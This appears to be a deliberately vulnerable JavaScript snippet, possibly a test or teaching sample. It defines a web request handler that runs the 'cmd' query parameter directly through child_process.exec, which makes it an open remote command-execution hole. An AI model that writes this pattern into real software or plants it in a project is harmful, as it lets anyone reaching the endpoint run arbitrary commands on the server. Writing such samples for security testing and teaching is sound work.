export function handler(req, res, db) {
    const cmd = req.query.cmd;
    child_process.exec(cmd);
}
